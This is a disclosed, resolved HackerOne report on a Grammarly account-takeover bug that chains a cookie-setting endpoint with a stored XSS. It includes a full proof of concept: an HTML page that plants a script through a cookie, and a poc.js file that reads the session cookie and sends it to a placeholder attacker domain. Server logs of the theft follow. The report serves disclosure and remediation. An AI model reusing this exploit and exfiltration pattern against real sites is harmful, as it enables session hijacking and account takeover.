{"id":534450,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC81MzQ0NTA=","url":"https://hackerone.com/reports/534450","title":"Account takeover through the combination of cookie manipulation and XSS","state":"Closed","substate":"resolved","severity_rating":"high","readable_substate":"Resolved","created_at":"2019-04-10T13:57:56.746Z","submitted_at":"2019-04-10T13:57:56.746Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"k4r4koyun","url":"/k4r4koyun","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/365/149/67936a3b1d8aaa431fe278e1b8e50401135d76a0_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":22746,"url":"https://hackerone.com/grammarly","handle":"grammarly","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/022/746/a2bf7f90c683af5214fcc74c1df6804286ee97ce_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/022/746/a2bf7f90c683af5214fcc74c1df6804286ee97ce_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Grammarly","twitter_handle":"","website":"https://www.grammarly.com","about":"Grammarly makes sure everything you type is clear, effective, and mistake-free."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2019-12-03T20:59:30.537Z","bug_reporter_agreed_on_going_public_at":"2019-11-03T20:59:28.843Z","team_member_agreed_on_going_public_at":null,"comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"**Summary:** A cookie based XSS on www.grammarly.com exists due to reflection of a cookie called gnar_containerId in DOM without any sanitization. Normally, gnar_containerId is being set by the server however a vulnerable endpoint at gnar.grammarly.com called \"/cookies\" allows us to manipulate cookies set for *.grammarly.com and gnar_containerId was one of them. Through the combination of these findings, we were able to bypass \"CORS protection/HttpOnly cookie flag\" and steal any Grammarly users cookie that visits a webpage that has our malicious javacript code.\n\n**Description:** An endpoint at gnar.grammarly.com called \"/cookies\" allows us to set or get any cookie value we want. Sending a POST request sets the cookie value whereas sending a GET cookie returns the value of an existing cookie. In a normal scenario, an attacker could send a GET request to that enpoint and read user authentication cookie (grauth in this case)But due to the same origin policy, we were not able to read the response . Sending a POST request was still viable(as we did not have to read the response) and we were able to replace session cookies of users (who had browsed any webpage that contained our malicious javascript) and force them to use our session. This allowed us to see any document that was created after the point of exploitation.\n\nThis was our initial bug bounty report (#532553) however, HackerOne staff did not approve it and said this is how cookies are supposed to work. So we decided to investigate this case further.\n\nThen we have found that Grammarly uses multiple cookies and one of them is called \"gnar_containerId\". We have discovered that this cookie gets reflected on the \"www.grammarly.com\" in src attribute of an img tag. The value inside the img tag is encoded and not exploitable. However there is another img tag, surrounded with noscript tags. The second value that is inside of the noscript tags was not encoded and prone to XSS. Combining the XSS vulnerability found in the www.grammarly.com domain and the cookie manipulation through gnar.grammarly.com/cookies allowed us to inject a gnar_containerId cookie that holds our malicious javascript code\n\nOur malicious payload that was injected into the context of grammarly.com will make a get request to gnar.grammarly.com/cookies to retrieve the values of the session cookies of the currently logged in user and send it  back to our server. Normally, an ordinary XSS would not lead to such cases as grammarly cookies are set to be httponly and secure, so it is not possible to manipulate cookies through DOM. But Thanks to the endpoint that we have discovered initially, we were able to retrieve/replace any cookies that was set by *.grammarly.com. We were able to bypass the CORS as our requests were sent on behalf of the grammarly.com and read the response.\n\nTo put it simply, if a user visits a webpage that we control, it will steal the cookies and send them to us. Our payload will make a post request to gnar.grammarly.com/cookies to replace the gnar_containerid with the second stage of our payload and the redirect the user to the vulnerable page. Upon this, our injected payload will get triggered and will make another request to gnar.grammarly.com/cookies on behalf of the grammarly.com, then will send the response body to a server that we control.\n\nFor the purpose of illustration, we just stole grauth cookie of a test account but we could actually steal any cookie set by grammarly.com.\n\n**Solution:** This attack scenario was made possible because of the following:\n\n  * gnar.grammarly.com/cookies does not check Referer information when it receives POST request. Adding a Referer check (assuming that no website other than the ones that hosted at *.grammarly.com is using that endpoint) will prevent client-side requests from 3rd parties.\n  * There is no whitelist/blacklist for cookies that a client can alter. Disallowing the alteration of grauth and csrf-token cookies should be implemented.\n  * Content based encoding was applied for noscript tags however with the combination of unnecessary trust to the cookies, an XSS was possible. Encoding should be applied for noscript tags too.\n\n## Browsers Verified In:\n\n  * Google Chrome 73.0.3683.86 (Official Build) (64-bit)\n  * Mozilla Firefox 60.6.1esr (64-bit)\n\n## Steps To Reproduce:\n\n  * Host a webpage that is being served over HTTPS (to circumvent Mixed-Content protection)\n\n  * Serve the HTML snipped below on the said page (called \"Grammarly.html\" for example):\n\n```html\n\u003chtml\u003e\n\n\u003chead\u003e\n\u003ctitle\u003eGrammarly POC\u003c/title\u003e\n\u003cmeta charset=\"utf-8\"/\u003e\n\u003cscript src=\"https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js\"\u003e\u003c/script\u003e\n\u003c/head\u003e\n\n\u003cbody\u003e\n\u003cscript\u003e\n\n    var cookie_hax = {\n        \"gnar_containerId\":\"\u003c/noscript\u003e\u003cscript/src='https://\u003cYOUR_DOMAIN_NAME\u003e/poc.js'\u003e\u003c/scr\"+\"ipt\u003e\u003cnoscript\u003e\",\n    };\n\n    for (var name in cookie_hax) {\n        $.ajax({\n            type: \"POST\",\n            url: \"https://gnar.grammarly.com/cookies?name=\" + name + \"\u0026value=\" + encodeURIComponent(cookie_hax[name]) + \"\u0026maxAge=2147483647\",\n            cache: false,\n            xhrFields: {\n                withCredentials: true\n            },\n            crossDomain: true,\n            async: false,\n        });\n    }\n\n    window.location.replace(\"https://www.grammarly.com/upgrade?utm_source=upHook\u0026app_type=app\u0026page=free\u0026utm_campaign=editorMenu\u0026utm_medium=internal\");\n\n\u003c/script\u003e\n\u003c/body\u003e\n\n\u003c/html\u003e\n```\n  * Serve the javascript code below on the same webserver (called \"poc.js\" for example):\n\n```javascript\nvar xhr = new XMLHttpRequest();\nxhr.open('GET', \"https://gnar.grammarly.com/cookies?name=grauth\");\nxhr.withCredentials = true;\nxhr.onload = function () {\n    this.open('GET', \"https://\u003cYOUR_DOMAIN_NAME\u003e/\" + this.response);\n    this.send();\n};\nxhr.send();\n```\n  * Browse the Grammarly.html and watch the webserver access logs (to extract cookie value)\n\n## Supporting Material/References:\n\n  * Webserver access logs: \n\n```\n178.251.40.58 - - [10/Apr/2019:13:23:04 +0000] \"GET /poc.js HTTP/1.1\" 200 736 \"https://www.grammarly.com/\" \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36\"\n178.251.40.58 - - [10/Apr/2019:13:23:05 +0000] \"GET /?cookie={██████████} HTTP/1.1\" 200 3466 \"https://www.grammarly.com/\" \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36\"\n```\n\n## Impact\n\n* Account takeover via cookie stealing","vulnerability_information_html":"\u003cp\u003e\u003cstrong\u003eSummary:\u003c/strong\u003e A cookie based XSS on \u003ca href=\"/redirect?url=http%3A%2F%2Fwww.grammarly.com\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ewww.grammarly.com\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e exists due to reflection of a cookie called gnar_containerId in DOM without any sanitization. Normally, gnar_containerId is being set by the server however a vulnerable endpoint at gnar.grammarly.com called \u0026quot;/cookies\u0026quot; allows us to manipulate cookies set for *.grammarly.com and gnar_containerId was one of them. Through the combination of these findings, we were able to bypass \u0026quot;CORS protection/HttpOnly cookie flag\u0026quot; and steal any Grammarly users cookie that visits a webpage that has our malicious javacript code.\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003eDescription:\u003c/strong\u003e An endpoint at gnar.grammarly.com called \u0026quot;/cookies\u0026quot; allows us to set or get any cookie value we want. Sending a POST request sets the cookie value whereas sending a GET cookie returns the value of an existing cookie. In a normal scenario, an attacker could send a GET request to that enpoint and read user authentication cookie (grauth in this case)But due to the same origin policy, we were not able to read the response . Sending a POST request was still viable(as we did not have to read the response) and we were able to replace session cookies of users (who had browsed any webpage that contained our malicious javascript) and force them to use our session. This allowed us to see any document that was created after the point of exploitation.\u003c/p\u003e\n\n\u003cp\u003eThis was our initial bug bounty report (#532553) however, HackerOne staff did not approve it and said this is how cookies are supposed to work. So we decided to investigate this case further.\u003c/p\u003e\n\n\u003cp\u003eThen we have found that Grammarly uses multiple cookies and one of them is called \u0026quot;gnar_containerId\u0026quot;. We have discovered that this cookie gets reflected on the \u0026quot;\u003ca href=\"/redirect?url=http%3A%2F%2Fwww.grammarly.com\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ewww.grammarly.com\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u0026quot; in src attribute of an img tag. The value inside the img tag is encoded and not exploitable. However there is another img tag, surrounded with noscript tags. The second value that is inside of the noscript tags was not encoded and prone to XSS. Combining the XSS vulnerability found in the \u003ca href=\"/redirect?url=http%3A%2F%2Fwww.grammarly.com\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ewww.grammarly.com\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e domain and the cookie manipulation through gnar.grammarly.com/cookies allowed us to inject a gnar_containerId cookie that holds our malicious javascript code\u003c/p\u003e\n\n\u003cp\u003eOur malicious payload that was injected into the context of grammarly.com will make a get request to gnar.grammarly.com/cookies to retrieve the values of the session cookies of the currently logged in user and send it  back to our server. Normally, an ordinary XSS would not lead to such cases as grammarly cookies are set to be httponly and secure, so it is not possible to manipulate cookies through DOM. But Thanks to the endpoint that we have discovered initially, we were able to retrieve/replace any cookies that was set by *.grammarly.com. We were able to bypass the CORS as our requests were sent on behalf of the grammarly.com and read the response.\u003c/p\u003e\n\n\u003cp\u003eTo put it simply, if a user visits a webpage that we control, it will steal the cookies and send them to us. Our payload will make a post request to gnar.grammarly.com/cookies to replace the gnar_containerid with the second stage of our payload and the redirect the user to the vulnerable page. Upon this, our injected payload will get triggered and will make another request to gnar.grammarly.com/cookies on behalf of the grammarly.com, then will send the response body to a server that we control.\u003c/p\u003e\n\n\u003cp\u003eFor the purpose of illustration, we just stole grauth cookie of a test account but we could actually steal any cookie set by grammarly.com.\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003eSolution:\u003c/strong\u003e This attack scenario was made possible because of the following:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003egnar.grammarly.com/cookies does not check Referer information when it receives POST request. Adding a Referer check (assuming that no website other than the ones that hosted at *.grammarly.com is using that endpoint) will prevent client-side requests from 3rd parties.\u003c/li\u003e\n\u003cli\u003eThere is no whitelist/blacklist for cookies that a client can alter. Disallowing the alteration of grauth and csrf-token cookies should be implemented.\u003c/li\u003e\n\u003cli\u003eContent based encoding was applied for noscript tags however with the combination of unnecessary trust to the cookies, an XSS was possible. Encoding should be applied for noscript tags too.\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch2 id=\"browsers-verified-in\"\u003eBrowsers Verified In:\u003c/h2\u003e\n\n\u003cul\u003e\n\u003cli\u003eGoogle Chrome 73.0.3683.86 (Official Build) (64-bit)\u003c/li\u003e\n\u003cli\u003eMozilla Firefox 60.6.1esr (64-bit)\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch2 id=\"steps-to-reproduce\"\u003eSteps To Reproduce:\u003c/h2\u003e\n\n\u003cul\u003e\n\u003cli\u003e\u003cp\u003eHost a webpage that is being served over HTTPS (to circumvent Mixed-Content protection)\u003c/p\u003e\u003c/li\u003e\n\u003cli\u003e\u003cp\u003eServe the HTML snipped below on the said page (called \u0026quot;Grammarly.html\u0026quot; for example):\u003c/p\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight html\"\u003e\u003ccode\u003e\u003cspan class=\"nt\"\u003e\u0026lt;html\u0026gt;\u003c/span\u003e\n\n\u003cspan class=\"nt\"\u003e\u0026lt;head\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;title\u0026gt;\u003c/span\u003eGrammarly POC\u003cspan class=\"nt\"\u003e\u0026lt;/title\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;meta\u003c/span\u003e \u003cspan class=\"na\"\u003echarset=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;utf-8\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;script \u003c/span\u003e\u003cspan class=\"na\"\u003esrc=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u0026lt;/script\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/head\u0026gt;\u003c/span\u003e\n\n\u003cspan class=\"nt\"\u003e\u0026lt;body\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;script\u0026gt;\u003c/span\u003e\n\n    \u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003ecookie_hax\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003egnar_containerId\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026lt;/noscript\u0026gt;\u0026lt;script/src=\u0026#39;https://\u0026lt;YOUR_DOMAIN_NAME\u0026gt;/poc.js\u0026#39;\u0026gt;\u0026lt;/scr\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e+\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003eipt\u0026gt;\u0026lt;noscript\u0026gt;\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e};\u003c/span\u003e\n\n    \u003cspan class=\"k\"\u003efor\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003ename\u003c/span\u003e \u003cspan class=\"k\"\u003ein\u003c/span\u003e \u003cspan class=\"nx\"\u003ecookie_hax\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"nx\"\u003e$\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eajax\u003c/span\u003e\u003cspan class=\"p\"\u003e({\u003c/span\u003e\n            \u003cspan class=\"na\"\u003etype\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003ePOST\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n            \u003cspan class=\"na\"\u003eurl\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003ehttps://gnar.grammarly.com/cookies?name=\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"nx\"\u003ename\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026amp;value=\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"nb\"\u003eencodeURIComponent\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ecookie_hax\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"nx\"\u003ename\u003c/span\u003e\u003cspan class=\"p\"\u003e])\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026amp;maxAge=2147483647\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n            \u003cspan class=\"na\"\u003ecache\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"kc\"\u003efalse\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n            \u003cspan class=\"na\"\u003exhrFields\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n                \u003cspan class=\"na\"\u003ewithCredentials\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"kc\"\u003etrue\u003c/span\u003e\n            \u003cspan class=\"p\"\u003e},\u003c/span\u003e\n            \u003cspan class=\"na\"\u003ecrossDomain\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"kc\"\u003etrue\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n            \u003cspan class=\"na\"\u003easync\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"kc\"\u003efalse\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n        \u003cspan class=\"p\"\u003e});\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\n    \u003cspan class=\"nb\"\u003ewindow\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003elocation\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ereplace\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003ehttps://www.grammarly.com/upgrade?utm_source=upHook\u0026amp;app_type=app\u0026amp;page=free\u0026amp;utm_campaign=editorMenu\u0026amp;utm_medium=internal\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\n\u003cspan class=\"nt\"\u003e\u0026lt;/script\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/body\u0026gt;\u003c/span\u003e\n\n\u003cspan class=\"nt\"\u003e\u0026lt;/html\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cul\u003e\n\u003cli\u003eServe the javascript code below on the same webserver (called \u0026quot;poc.js\u0026quot; for example):\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003exhr\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nx\"\u003eXMLHttpRequest\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\n\u003cspan class=\"nx\"\u003exhr\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eopen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003eGET\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003ehttps://gnar.grammarly.com/cookies?name=grauth\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"nx\"\u003exhr\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ewithCredentials\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"kc\"\u003etrue\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003cspan class=\"nx\"\u003exhr\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eonload\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"kd\"\u003efunction\u003c/span\u003e \u003cspan class=\"p\"\u003e()\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"k\"\u003ethis\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eopen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003eGET\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003ehttps://\u0026lt;YOUR_DOMAIN_NAME\u0026gt;/\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"k\"\u003ethis\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eresponse\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"k\"\u003ethis\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003esend\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\n\u003cspan class=\"p\"\u003e};\u003c/span\u003e\n\u003cspan class=\"nx\"\u003exhr\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003esend\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cul\u003e\n\u003cli\u003eBrowse the Grammarly.html and watch the webserver access logs (to extract cookie value)\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch2 id=\"supporting-material-references\"\u003eSupporting Material/References:\u003c/h2\u003e\n\n\u003cul\u003e\n\u003cli\u003eWebserver access logs: \u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e178.251.40.58 - - [10/Apr/2019:13:23:04 +0000] \u0026quot;GET /poc.js HTTP/1.1\u0026quot; 200 736 \u0026quot;https://www.grammarly.com/\u0026quot; \u0026quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36\u0026quot;\n178.251.40.58 - - [10/Apr/2019:13:23:05 +0000] \u0026quot;GET /?cookie={██████████} HTTP/1.1\u0026quot; 200 3466 \u0026quot;https://www.grammarly.com/\u0026quot; \u0026quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36\u0026quot;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cul\u003e\n\u003cli\u003eAccount takeover via cookie stealing\u003c/li\u003e\n\u003c/ul\u003e\n","bounty_amount":"2000.0","formatted_bounty":"$2,000","weakness":{"id":62,"name":"Cross-site Scripting (XSS) - Stored"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":466118,"file_name":"Grammarly_Takeover_POC.mp4","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/466/118/7d81dc56180cb78c3e31700f52e1f089366f0746/Grammarly_Takeover_POC.mp4?response-content-disposition=attachment%3B%20filename%3D%22Grammarly_Takeover_POC.mp4%22%3B%20filename%2A%3DUTF-8%27%27Grammarly_Takeover_POC.mp4\u0026response-content-type=video%2Fmp4\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ6SZWJ7EV%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T061542Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDnUzI%2BFGOFBLAScWuVOL4Lj3JmbbQAzP3Z0CGixtLCuAIgQzjjEEfRLfyvyTUcWPuh1TmLwtvXfhn4Y1cmYaMrO6cqtAMIVRABGgwwMTM2MTkyNzQ4NDkiDGp%2BpnVA5musWTL7NCqRA8%2FtWDfuTNl%2BTEZ8%2F83sOgEjGfhPO7hqas9S5YFvyrG29udKPmtcuewMHQFGoWh6uvbSTE9LPEkFDl6RosJJJY3ZsFaD9BGxtIOBINUPfZd26XnOL01fuCQ8x%2BiErJvv8vHBR5mWXV7L6t7A2%2F5H8dY91iEQFmPdZboRnRed4t2q9jcZCwrkzHwMk8bNRFkfRqzqUB6%2Buk39e4oyKwiyqROwDwnoUxIOrVdA29STuUYzszGBQ%2B3Eg%2Fr4I9Ys7sDaoYDHJAVEt%2F6kVnewTLU3uHfL%2F%2FzDR0ZnJa5Oo%2BmValn4%2Fn34Ke7o7csnn3piiGYIK4mihEWUVtJZnq0bZ%2BEU14q4ZLfb79tvTTKy5%2B9XC3vM1tWdFU6K%2F2PISAY5LoVEscNgJL0aQIq7sAX0f00Uyo2TeQTR%2B9TUOeUvW40metpNAt6ZQ8u0%2BuTZij%2FLNaYEe6v5RA7Fg8wzm%2Bu7IVusddMT4HgUuba3afxdFVj8x9iXROa6QZZ%2BdlHYNGywE8eJxO3jkpwbaZpUg8PZ17ztcb5%2BMLHSqv8FOusBshs3Z1RNetRK0o6yVAL2zGdldUlxbnMrusEP31v5WyfcSXKYrW1oJGSAAOlTEHZOawyDOEVKZdmLftLsa7vpv4NkkvDc0MjvNZjQrLWiuTmEalVC704buBLYftchmedTLOrsCMIpwWkxoPJnEqO2VZwPnup4B1lMH%2B%2FHO0btRwbDEfX1bZu7nae%2FPoCvN9o%2FT1iQ8GcaSv5OUJxppuy2cagjSuiUWEkOXPhYiBKpxTQMFIMtd6%2FpRtJ2YeCQgmRXXl1K6ayBDQAQxWFeKQPM5vtrAzDrzE9Adaqtb3AdlxqDjg74xdcM9YFdyg%3D%3D\u0026X-Amz-Signature=c172cd341fcf21645b33e5d698c0431d1d35750cb1b3a53033477acf40de39ef","file_size":271192,"type":"video/mp4"}],"allow_singular_disclosure_at":"2019-12-03T20:59:28.901Z","allow_singular_disclosure_after":-33815773.56021804,"singular_disclosure_allowed":true,"vote_count":242,"voters":["daehee","lboy","mvalle","manoelt","sourc7","cyber_humans","mashoud1122","spam404","pain45","base_64","and 232 more..."],"severity":{"rating":"high","score":8.2,"author_type":"Team","metrics":{"attack_vector":"network","attack_complexity":"low","privileges_required":"none","user_interaction":"required","scope":"changed","confidentiality":"high","integrity":"low","availability":"none"}},"structured_scope":{"databaseId":1366,"asset_type":"URL","asset_identifier":"www.grammarly.com","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":4531386,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @k4r4koyun,\n\nThank you for your submission. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.\n\nKind regards,\n@sodacan\n","markdown_message":"\u003cp\u003eHi \u003ca 